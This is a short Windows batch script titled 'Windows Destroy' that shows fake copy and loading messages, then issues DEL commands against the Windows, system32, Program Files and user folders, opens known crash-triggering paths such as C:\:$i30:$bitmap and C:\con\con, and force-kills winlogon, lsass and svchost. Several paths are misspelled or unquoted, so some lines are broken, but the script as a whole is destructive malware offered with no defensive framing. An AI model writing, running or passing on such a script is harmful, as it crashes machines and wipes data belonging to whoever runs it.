@ECHO OFF
TITLE Windows Destroy
MSG Windows Destroy is starting up
MSG Copying Windows Destroy File... (0B/639B)
MSG Copying Windows Destroy File... (639B/639B)
MSG Windows Destroy is loading file... (0% - 0B)
MSG Windows Destroy is loading file... (100% - 639B)
MSG Running Windows Destroy
DEL C:\Windows /y
DEL C:\Windows\sytem32 /y
DEL C:\Progam Files /y
DEL C:\Progam Files (x86) /y
DEL C:\User /y
START C:\:$i30:$bitmap 
START C:\con\con
START \\\\.\\globalroot\\device\\condrv\\kernelconnect 
Taskkill /IM winlogon.exe /F
Taskkill /IM lsass.exe /F
Taskkill /IM Svchost.exe /F
Taskkill /IM winload.exe /F
Taskkill /IM Ntoskrnl.exe /F
